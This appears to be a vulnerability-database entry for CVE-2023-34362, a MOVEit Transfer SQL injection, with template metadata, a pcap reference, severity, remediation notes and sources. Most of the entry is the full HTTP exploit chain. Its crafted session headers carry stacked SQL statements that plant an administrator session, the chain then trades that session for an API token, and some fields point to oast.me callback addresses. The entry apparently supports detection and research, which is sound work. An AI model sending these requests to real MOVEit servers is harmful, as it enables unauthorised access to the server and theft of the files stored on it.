---
layout: post
cve_id: CVE-2023-34362
title: MOVEit Transfer - Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-34362.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-34362.yaml
snort2_rule: N/A
snort3_rule: N/A
author: princechaddha,rootxharsh,ritikchaddha,pdresearch
severity: critical
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access,
  data theft, and potential compromise of the entire server.

  '
remediation: 'Apply the latest security patches and updates provided by the vendor
  to mitigate this vulnerability.

  '
reference:
- https://github.com/horizon3ai/CVE-2023-34362
- https://www.horizon3.ai/moveit-transfer-cve-2023-34362-deep-dive-and-indicators-of-compromise/
- https://nvd.nist.gov/vuln/detail/CVE-2023-34362
- http://packetstormsecurity.com/files/172883/MOVEit-Transfer-SQL-Injection-Remote-Code-Execution.html
- http://packetstormsecurity.com/files/173110/MOVEit-SQL-Injection.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-34362
  cwe-id: CWE-89
  epss-score: 0.94254
  epss-percentile: 0.99927
  cpe: cpe:2.3:a:progress:moveit_cloud:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 7
  vendor: progress
  product: moveit_cloud
  shodan-query: http.favicon.hash:989289239
  fofa-query: icon_hash=989289239
tags:
- cve2023
- cve
- packetstorm
- moveit
- rce
- sqli
- intrusive
- kev
- progress
- vkev
- vuln
---

## üîç Vulnerability Description
In Progress MOVEit Transfer before 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1), a SQL injection vulnerability has been found in the MOVEit Transfer web application that could allow an unauthenticated attacker to gain access to MOVEit Transfer's database. Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an attacker may be able to infer information about the structure and contents of the database, and execute SQL statements that alter or delete database elements. NOTE: this is exploited in the wild in May and June 2023; exploitation of unpatched systems can occur via HTTP or HTTPS. All versions (e.g., 2020.0 and 2019x) before the five explicitly mentioned versions are affected, including older unsupported versions.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: python-requests/2.26.0
Connection: close
Cookie: siLockLongTermInstID=0
Accept-Encoding: gzip
```

```nohighlight
POST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.6
Connection: close
Transfer-Encoding: chunked
Ax-silock-transaction: folder_add_by_path
Cookie: siLockLongTermInstID=0
X-siLock-SessVar0: MyUsername: Guest
X-siLock-SessVar1: MyPkgAccessCode: 123
X-siLock-SessVar2: MyGuestEmailAddr: my_guest_email@oast.me
X-siLock-Transaction: session_setvars
Accept-Encoding: gzip
0
```

```nohighlight
POST /guestaccess.aspx HTTP/1.1
Host: www.victim.com
User-Agent: python-requests/2.26.0
Connection: close
Content-Length: 9
Accept: */*
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Cookie: siLockLongTermInstID=0
Arg06=123
```

```nohighlight
POST /moveitisapi/moveitisapi.dll?action=m2 HTTP/1.1
Host: www.victim.com
User-Agent: python-requests/2.26.0
Connection: close
Transfer-Encoding: chunked
Accept: */*
Accept-Encoding: gzip, deflate
Ax-silock-transaction: folder_add_by_path
Cookie: siLockLongTermInstID=0
X-siLock-SessVar0: MyPkgID: 0
X-siLock-SessVar1: MyPkgSelfProvisionedRecips: SQL Injection'); INSERT INTO activesessions (SessionID) values ('38BX90tAmt9XS4u4D5WX9Zrnx3c');UPDATE activesessions SET Username=(select Username from users order by permission desc limit 1) WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET LoginName='test@test.com' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET RealName='test@test.com' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET InstId='1234' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET IpAddress='34HSQd' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET LastTouch='2099-06-10 09:30:00' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET DMZInterface='10' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET Timeout='60' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET ResilNode='10' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c';UPDATE activesessions SET AcctReady='1' WHERE SessionID='38BX90tAmt9XS4u4D5WX9Zrnx3c'; -- asdf
X-siLock-Transaction: session_setvars
0
```

```nohighlight
POST /guestaccess.aspx HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0.) Gecko/20100101 Firefox/140.0.
Connection: close
Content-Length: 141
Content-Type: application/x-www-form-urlencoded
Cookie: siLockLongTermInstID=0
Accept-Encoding: gzip
CsrfToken=xuJqk8&transaction=secmsgpost&Arg01=email_subject&Arg04=email_body&Arg06=123&Arg05=send&Arg08=email%40oast.me&Arg09=attachment_list
```

```nohighlight
POST /api/v1/auth/token HTTP/1.1
Host: www.victim.com
User-Agent: python-requests/2.26.0
Connection: close
Content-Length: 40
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Cookie: ASP.NET_SessionId=38BX90tAmt9XS4u4D5WX9Zrnx3c
grant_type=session&username=x&password=x
```

